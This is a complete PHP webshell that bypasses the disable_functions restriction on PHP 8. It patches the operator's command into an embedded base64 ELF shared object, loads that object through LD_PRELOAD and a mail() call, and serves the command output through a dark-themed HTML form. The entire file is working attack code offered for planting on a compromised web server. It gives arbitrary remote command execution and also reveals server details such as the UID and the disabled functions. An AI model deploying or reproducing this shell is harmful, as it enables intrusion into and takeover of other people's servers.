<?php
/**
 * LD_PRELOAD Bypass Webshell
 * PHP 8.x disable_functions bypass via putenv + mail + LD_PRELOAD
 * 访问即用，输入命令执行
 */
error_reporting(0);
$SO_B64 = 'f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAACAEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAogIAAAAAAACyAwAAAAAAAAAQAAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAAAAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAAAACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAajtYmUi7L2Jpbi9zaABTSInnaC1jAABIieZS6OkAAABbY29tbWFuZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdAFZXSInmDwU=';
$SO_START = 434;
$SO_END   = 665;
$SO_MAX_LEN = $SO_END - $SO_START - 5; // 留一点margin

$OUTPUT = '';
$CMD   = isset($_POST['cmd']) ? trim($_POST['cmd']) : '';

if ($CMD !== '') {
    if (strlen($CMD) > $SO_MAX_LEN) {
        $OUTPUT = "ERROR: Command too long. Max " . $SO_MAX_LEN . " bytes.\n";
    } else {
        $so_data = base64_decode($SO_B64);
        // 填充空格
        for ($i = $SO_START; $i <= $SO_END; $i++) {
            $so_data[$i] = ' ';
        }
        $so_data[$SO_END] = "\x00";
        // 写入命令（exec 重定向所有输出）
        $cmd_full = 'exec > /tmp/_rshell_out.txt 2>&1; ' . $CMD;
        for ($j = 0; $j < strlen($cmd_full); $j++) {
            $so_data[$SO_START + $j] = $cmd_full[$j];
        }
        // 写入so文件
        $so_path = '/tmp/_rs' . getmypid() . '.so';
        file_put_contents($so_path, $so_data);
        // LD_PRELOAD + 触发
        putenv("LD_PRELOAD=$so_path");
        @mail('x', '', '', '', '-s');
        // 短暂等待子进程执行
        usleep(200000);
        // 读取输出
        if (file_exists('/tmp/_rshell_out.txt')) {
            $OUTPUT = file_get_contents('/tmp/_rshell_out.txt');
            @unlink('/tmp/_rshell_out.txt');
        } else {
            $OUTPUT = "(no output — command may have failed or timed out)";
        }
        @unlink($so_path);
    }
}
?>
<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RCE Shell — LD_PRELOAD Bypass</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d1117;color:#c9d1d9;font-family:'SF Mono',Consolas,monospace;font-size:13px;padding:20px}
.wrap{max-width:1000px;margin:0 auto}
h2{color:#58a6ff;margin-bottom:16px;font-size:18px}
.info{color:#8b949e;margin-bottom:14px;font-size:12px}
.info span{color:#3fb950}
form{display:flex;gap:10px;margin-bottom:16px}
form input[type=text]{flex:1;padding:10px 14px;background:#161b22;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;font-family:inherit;font-size:14px}
form input[type=text]:focus{outline:none;border-color:#58a6ff}
form input[type=submit]{padding:10px 24px;background:#238636;border:1px solid #2ea043;border-radius:6px;color:#fff;font-size:14px;cursor:pointer;font-family:inherit}
form input[type=submit]:hover{background:#2ea043}
pre{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:16px;white-space:pre-wrap;word-break:break-all;min-height:60px;max-height:500px;overflow:auto;font-family:inherit;font-size:13px;line-height:1.5}
</style>
</head>
<body>
<div class="wrap">
<h2>[ LD_PRELOAD RCE Shell ]</h2>
<div class="info">
    UID: <span><?=function_exists('posix_getuid')?posix_getuid():'?'?></span> &bull;
    PHP: <span><?=PHP_VERSION?></span> &bull;
    Dir: <span><?=getcwd()?></span><br>
    Disabled: <?=ini_get('disable_functions')?>
</div>
<form method="post">
    <input type="text" name="cmd" placeholder="输入命令，如: id; uname -a; ls -la /" value="<?=htmlspecialchars($CMD)?>" autofocus>
    <input type="submit" value="Execute">
</form>
<pre><?=htmlspecialchars($OUTPUT)?></pre>
</div>
</body>
</html>
